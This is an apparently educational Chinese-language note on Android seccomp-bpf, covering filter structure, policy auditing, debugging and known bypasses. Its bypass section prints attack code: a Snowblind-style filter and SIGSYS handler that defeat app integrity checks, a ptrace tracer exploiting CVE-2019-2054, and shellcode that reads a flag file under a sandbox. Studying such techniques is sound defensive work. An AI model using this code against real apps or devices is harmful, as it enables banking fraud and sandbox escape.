# 4x02 - seccomp-bpf

Seccomp (Secure Computing) 是 Linux 内核提供的一种限制进程系统调用的机制。

在 Android 上，seccomp 的定位是"减灾"而不是"绝对安全"：即使出现 RCE，攻击者可用的 syscall 被压缩后，继续横向/提权的空间会显著变小。

## 1. Android 中的应用

- **应用进程**: 限制只能调用必要的系统调用，防止利用内核漏洞。
- **媒体服务**: 极度收窄攻击面。

常见落点包括：

- 解析不可信输入的进程（多媒体、网络相关）
- 高价值系统守护进程
- 部分 framework/native 服务进程

## 2. seccomp 的基本模型

seccomp-bpf 通常由一组 BPF 规则构成：

- 对 syscall number（以及参数）做匹配
- 匹配结果决定：允许、拒绝、终止进程、返回 errno 等

### 2.1 BPF 规则结构

每条 BPF 指令由 struct sock_filter 定义：

```c
struct sock_filter {
    __u16 code;   // 操作码
    __u8  jt;     // 条件为真时的跳转偏移
    __u8  jf;     // 条件为假时的跳转偏移
    __u32 k;      // 通用常量（syscall number / 比较值等）
};
```

整个 filter 由 struct sock_fprog 封装：

```c
struct sock_fprog {
    unsigned short len;           // 指令数量
    struct sock_filter *filter;   // 指令数组
};
```

### 2.2 常见 BPF 操作码

| 操作码 | 含义 |
|--------|------|
| BPF_LD + BPF_W + BPF_ABS | 加载 seccomp_data 中指定偏移的 32 位值到累加器 A |
| BPF_JMP + BPF_JEQ + BPF_K | 若 A == k 则跳转 jt，否则跳转 jf |
| BPF_JMP + BPF_JGE + BPF_K | 若 A >= k 则跳转 jt，否则跳转 jf |
| BPF_RET + BPF_K | 返回决策（ALLOW / ERRNO / TRAP / TRACE） |

### 2.3 seccomp_data 结构

BPF 程序操作的输入数据：

```c
struct seccomp_data {
    int   nr;                    // syscall number (offset 0)
    __u32 arch;                  // AUDIT_ARCH_* 值 (offset 4)
    __u64 instruction_pointer;   // 触发 syscall 的 PC
    __u64 args[6];               // syscall 参数 (offset 16+)
};
```

### 2.4 BPF 规则解析示例

```c
#include <stdio.h>
#include <stdlib.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>
#include <sys/syscall.h>

void disasm_bpf_insn(struct sock_filter *insn, int idx) {
    printf("%04d: ", idx);
    
    __u16 code = insn->code;
    __u8  jt = insn->jt;
    __u8  jf = insn->jf;
    __u32 k = insn->k;
    
    if ((code & 0x07) == BPF_LD) {
        if ((code & 0x18) == BPF_W && (code & 0x60) == BPF_ABS) {
            const char *field = "unknown";
            if (k == 0) field = "nr (syscall number)";
            else if (k == 4) field = "arch";
            else if (k >= 16 && k < 64) 
                field = "args[(offset-16)/8]";
            printf("A = seccomp_data[%u] (%s)\n", k, field);
            return;
        }
    }
    
    if ((code & 0x07) == BPF_JMP) {
        if ((code & 0xf0) == BPF_JEQ) {
            printf("if (A == 0x%x) goto %d else goto %d\n", 
                   k, idx + 1 + jt, idx + 1 + jf);
            return;
        }
        if ((code & 0xf0) == BPF_JGE) {
            printf("if (A >= 0x%x) goto %d else goto %d\n",
                   k, idx + 1 + jt, idx + 1 + jf);
            return;
        }
        if ((code & 0xf0) == BPF_JA) {
            printf("goto %d\n", idx + 1 + k);
            return;
        }
    }
    
    if ((code & 0x07) == BPF_RET) {
        __u32 action = k & SECCOMP_RET_ACTION_FULL;
        const char *action_str = "UNKNOWN";
        switch (action) {
            case SECCOMP_RET_KILL_PROCESS: action_str = "TERMINATE_PROCESS"; break;
            case SECCOMP_RET_KILL_THREAD:  action_str = "TERMINATE_THREAD"; break;
            case SECCOMP_RET_TRAP:         action_str = "TRAP (SIGSYS)"; break;
            case SECCOMP_RET_ERRNO:        
                printf("return ERRNO(%d)\n", k & 0xFFFF);
                return;
            case SECCOMP_RET_TRACE:        action_str = "TRACE (ptrace)"; break;
            case SECCOMP_RET_ALLOW:        action_str = "ALLOW"; break;
        }
        printf("return %s\n", action_str);
        return;
    }
    
    printf("code=0x%04x jt=%u jf=%u k=0x%08x\n", code, jt, jf, k);
}

void disasm_bpf_prog(struct sock_filter *filter, unsigned short len) {
    printf("=== BPF Program (%d instructions) ===\n", len);
    for (int i = 0; i < len; i++) {
        disasm_bpf_insn(&filter[i], i);
    }
}
```

### 2.5 使用 seccomp-tools 解析

seccomp-tools 是分析 seccomp filter 的标准工具：

```bash
# 安装
gem install seccomp-tools

# 从可执行文件 dump filter
seccomp-tools dump ./target_binary

# 从运行中进程 dump (需要 root)
sudo seccomp-tools dump --pid <PID>

# 反汇编原始 BPF 文件
seccomp-tools disasm ./filter.bpf

# 模拟 filter 对特定 syscall 的响应
seccomp-tools emu ./filter.bpf
```

输出示例：

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc00000b7  if (A != ARCH_AARCH64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0010
 0004: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0010
 0005: 0x15 0x04 0x00 0x0000003f  if (A == exit) goto 0010
 ...
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return TERMINATE
```

## 3. Android 常见进程的 seccomp 策略

### 3.1 策略文件位置

Android 的 seccomp 策略通常位于：

```
/system/etc/seccomp_policy/
├── app_policy             # 普通应用进程
├── mediacodec-arm.policy  # 媒体编解码进程
├── mediaextractor.policy  # 媒体提取进程
├── webview_zygote.policy  # WebView 进程
└── ...
```

### 3.2 应用进程策略 (Zygote fork)

通过 Zygote fork 出的应用进程默认继承 seccomp filter：

```bash
# 检查应用进程的 seccomp 状态
adb shell cat /proc/$(pidof com.example.app)/status | grep Seccomp
# Seccomp: 2  (filter mode)

# 查看允许的 syscall（需要 root + 内核支持）
adb shell cat /proc/$(pidof com.example.app)/seccomp_filter
```

典型的应用进程策略允许：

- 基础 I/O: read, write, close, ioctl
- 内存管理: mmap, mprotect, munmap, brk
- 进程/线程: clone, futex, exit, exit_group
- 文件操作: openat, fstat, lseek（受限路径）
- 网络: socket, connect, sendto, recvfrom（受限类型）

通常禁止：

- ptrace（调试）
- process_vm_readv/writev（跨进程内存访问）
- perf_event_open（性能监控）
- bpf（eBPF 程序加载）
- userfaultfd（用户态缺页处理）

### 3.3 媒体服务策略

媒体相关进程（mediaserver, mediacodec）有更严格的限制：

```bash
# 查看 mediacodec 的策略
adb shell cat /system/etc/seccomp_policy/mediacodec-arm64.policy
```

典型限制：

- 禁止 fork, exec* 系列
- 禁止大部分网络 syscall
- 只允许与编解码相关的必要操作

### 3.4 策略审计脚本

```python
#!/usr/bin/env python3
"""
Android Seccomp Policy Analyzer
"""

import subprocess
import re
from collections import defaultdict

def get_process_seccomp_status(pid):
    try:
        result = subprocess.run(
            ['adb', 'shell', f'cat /proc/{pid}/status'],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            if line.startswith('Seccomp:'):
                return int(line.split(':')[1].strip())
    except:
        return -1
    return 0

def list_processes():
    result = subprocess.run(
        ['adb', 'shell', 'ps -A -o PID,NAME'],
        capture_output=True, text=True
    )
    
    processes = []
    for line in result.stdout.splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 2:
            pid, name = parts[0], parts[1]
            processes.append((pid, name))
    return processes

def audit_seccomp():
    status_map = {
        0: 'DISABLED',
        1: 'STRICT',
        2: 'FILTER'
    }
    
    by_status = defaultdict(list)
    
    for pid, name in list_processes():
        status = get_process_seccomp_status(pid)
        status_str = status_map.get(status, f'UNKNOWN({status})')
        by_status[status_str].append(f"{name} ({pid})")
    
    print("=== Seccomp Audit Report ===\n")
    
    if 'DISABLED' in by_status:
        print("[!] Processes WITHOUT seccomp protection:")
        for p in by_status['DISABLED'][:20]:
            print(f"    - {p}")
        if len(by_status['DISABLED']) > 20:
            print(f"    ... and {len(by_status['DISABLED']) - 20} more")
        print()
    
    print(f"[*] FILTER mode: {len(by_status.get('FILTER', []))} processes")
    print(f"[*] STRICT mode: {len(by_status.get('STRICT', []))} processes")
    print(f"[*] DISABLED:    {len(by_status.get('DISABLED', []))} processes")

if __name__ == '__main__':
    audit_seccomp()
```

## 4. 安全研究与 Bypass 技术

### 4.1 Snowblind 恶意软件案例 (2024)

Snowblind 是 2024 年发现的 Android 银行木马，创新性地利用 seccomp 绕过安全检测。

**攻击原理**：

1. 恶意软件将 native library 注入目标银行应用
2. 在目标应用的安全检查代码执行**之前**，注入代码安装自定义 seccomp filter
3. filter 配置为对 open() 等 syscall 返回 SECCOMP_RET_TRAP
4. 同时注册 SIGSYS signal handler 拦截这些调用
5. handler 可以修改参数、伪造返回值，使完整性检查失效

**技术实现**：

```c
void install_malicious_filter() {
    struct sock_filter filter[] = {
        // 加载 syscall number
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 
                 offsetof(struct seccomp_data, nr)),
        
        // 拦截 open/openat -> SIGSYS
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRAP),
        
        // 其他 syscall 允许
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}

void sigsys_handler(int sig, siginfo_t *info, void *ctx) {
    ucontext_t *uctx = (ucontext_t *)ctx;
    int syscall_nr = info->si_syscall;
    
    if (syscall_nr == __NR_openat) {
        char *pathname = (char *)uctx->uc_mcontext.regs[1];
        
        // 如果是安全检查相关文件，返回伪造结果
        if (strstr(pathname, "integrity") || 
            strstr(pathname, "tamper")) {
            uctx->uc_mcontext.regs[0] = -1;
            errno = ENOENT;
            return;
        }
        
        // 正常文件，执行真实 syscall
        uctx->uc_mcontext.regs[0] = syscall(__NR_openat, 
            uctx->uc_mcontext.regs[0],
            pathname,
            uctx->uc_mcontext.regs[2],
            uctx->uc_mcontext.regs[3]);
    }
}

void setup_sigsys_handler() {
    struct sigaction sa = {
        .sa_sigaction = sigsys_handler,
        .sa_flags = SA_SIGINFO,
    };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSYS, &sa, NULL);
}
```

**防御建议**：

- 安全检查应在更早的时机执行（如 JNI_OnLoad 之前）
- 检测是否存在非预期的 seccomp filter
- 使用 hardware-backed attestation 而非纯软件检测

### 4.2 ptrace Bypass (CVE-2019-2054)

在 Linux kernel < 4.8 上，seccomp 与 ptrace 存在配合问题。

**漏洞原理**：

当 seccomp filter 返回 SECCOMP_RET_TRACE 时，内核会通知 ptrace tracer。但在旧内核中，tracer 修改 syscall number 或参数后，内核**不会重新检查** seccomp filter。

**攻击流程**：

```c
// 被沙箱限制的子进程
void sandboxed_child() {
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 
                 offsetof(struct seccomp_data, nr)),
        // execve -> TRACE (通知 tracer)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRACE),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    
    // ... 安装 filter ...
    execve("/bin/sh", NULL, NULL);
}

// 恶意 tracer 进程
void malicious_tracer(pid_t child) {
    int status;
    ptrace(PTRACE_ATTACH, child, NULL, NULL);
    
    while (1) {
        waitpid(child, &status, 0);
        
        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
            struct user_regs_struct regs;
            ptrace(PTRACE_GETREGS, child, NULL, &regs);
            
            if (regs.orig_rax == __NR_execve) {
                // 漏洞：修改 syscall 为允许的 syscall
                // 内核不会重新检查 seccomp!
                regs.orig_rax = __NR_getpid;
                ptrace(PTRACE_SETREGS, child, NULL, &regs);
            }
        }
        
        ptrace(PTRACE_CONT, child, NULL, NULL);
    }
}
```

**受影响范围**：

- Android 8.x/9.x 部分设备（Pixel 1, 2 等早期设备）
- 任何使用 Linux kernel < 4.8 的系统

**修复**：

- Kernel 4.8+ 在 ptrace 修改后会重新检查 seccomp filter
- 策略中应明确禁止 ptrace syscall

### 4.3 SIGSYS Handler 绕过

如果 seccomp 使用 SECCOMP_RET_TRAP 并依赖 SIGSYS handler 做额外处理，可能存在绕过。

**攻击场景**：

```c
// 错误示例：handler 中重新实现被禁 syscall
void vulnerable_sigsys_handler(int sig, siginfo_t *info, void *ctx) {
    ucontext_t *uctx = (ucontext_t *)ctx;
    int nr = info->si_syscall;
    
    // 错误：在 handler 中使用不受限的方式执行被禁操作
    if (nr == __NR_open) {
        // 通过 IPC 请求未受保护的 helper 进程执行
        send_to_helper("OPEN", pathname);  // 绕过!
    }
}
```

**防御原则**：

- SIGSYS handler 不应具有比 seccomp filter 更高的权限
- handler 执行的任何操作都应在同等限制下
- 避免在 handler 中与外部进程通信

### 4.4 Syscall 替代技术

当某些 syscall 被禁止时，攻击者可能使用替代方法达成目标：

| 被禁 syscall | 可能的替代方案 |
|-------------|---------------|
| execve | memfd_create + fexecve / mmap 手动加载 |
| open | openat / openat2 / 通过 /proc/self/fd |
| read | pread64 / readv / mmap + 内存访问 |
| write | pwrite64 / writev / sendto (配合 socket) |
| mmap | mremap 扩展现有映射 |
| socket | 继承父进程的 socket fd |

**受限环境下的 shellcode 技术**：

```nasm
; 示例：仅使用 read/write/mmap 读取 flag 文件
; 前提：open 被禁但 openat 被允许

section .text
global _start

_start:
    ; openat(AT_FDCWD, "/flag", O_RDONLY)
    mov rax, 257        ; __NR_openat
    mov rdi, -100       ; AT_FDCWD
    lea rsi, [rel flag_path]
    xor rdx, rdx        ; O_RDONLY
    syscall
    
    mov rdi, rax        ; fd
    
    ; read(fd, buf, 100)
    xor rax, rax        ; __NR_read
    lea rsi, [rel buffer]
    mov rdx, 100
    syscall
    
    ; write(1, buf, rax)
    mov rdx, rax
    mov rax, 1          ; __NR_write
    mov rdi, 1          ; stdout
    lea rsi, [rel buffer]
    syscall
    
    ; exit(0)
    mov rax, 60
    xor rdi, rdi
    syscall

flag_path: db "/flag", 0
buffer: times 100 db 0
```

## 5. 相关 CVE

| CVE | 描述 | 影响版本 |
|-----|------|---------|
| CVE-2019-2054 | ptrace 可绕过 seccomp filter，内核在 tracer 修改 syscall 后不重新检查 | Linux kernel < 4.8 |
| CVE-2020-0261 | Android C2 (flame) 设备缺少 seccomp 配置文件导致保护缺失 | 特定 Android 设备 |
| CVE-2022-22057 | Qualcomm GPU 驱动漏洞可导致 seccomp 沙箱逃逸 | 特定高通芯片组 |

## 6. 调试与排查

### 6.1 快速确认 seccomp 状态

```bash
adb shell cat /proc/<pid>/status | grep Seccomp
```

常见取值：

- 0：未启用
- 1：strict
- 2：filter（Android 常见）

### 6.2 观察触发情况

当进程因 seccomp 被终止或返回 errno 时，通常表现为：

- 进程异常退出（可能产生日志/tombstone）
- 功能路径返回特定错误码

排查时可结合：

- logcat 中的 linker/系统服务日志
- tombstone 堆栈定位到触发点附近的 syscall
- dmesg 中的 seccomp 审计日志（需要内核配置）

### 6.3 动态分析脚本

```bash
#!/bin/bash
# seccomp_monitor.sh - 监控设备上的 seccomp 事件

# 监控 kernel 日志中的 seccomp 事件
adb shell dmesg -w | grep -E "seccomp|audit" &

# 监控 logcat 中的相关错误
adb logcat -v time | grep -iE "seccomp|SIGSYS|syscall.*denied"
```

## 7. 与其他机制的协同

seccomp 往往与以下机制组合出现：

- **SELinux**: 资源访问控制
- **namespace/cgroup**: 隔离与资源限制
- **权限拆分**: 把高风险逻辑放入低权限进程
- **Capabilities**: 细粒度权限控制

综合看待能更准确判断：某个漏洞是否能从"崩溃"升级为"可控利用"。

## 参考资源

**官方文档**：
- https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html - Linux 内核 seccomp BPF 文档
- https://source.android.com/docs/security/app-sandbox - Android 应用沙箱模型
- https://man7.org/linux/man-pages/man2/seccomp.2.html - seccomp(2) man page

**工具**：
- https://github.com/david942j/seccomp-tools - seccomp BPF 分析工具
- https://github.com/unixist/seccomp-bypass - 受限 syscall 下的 shellcode 集合

**研究与案例**：
- Promon: Snowblind Android Malware Analysis (2024)
- Exploit-DB #46434: Android Kernel < 4.8 ptrace seccomp Filter Bypass
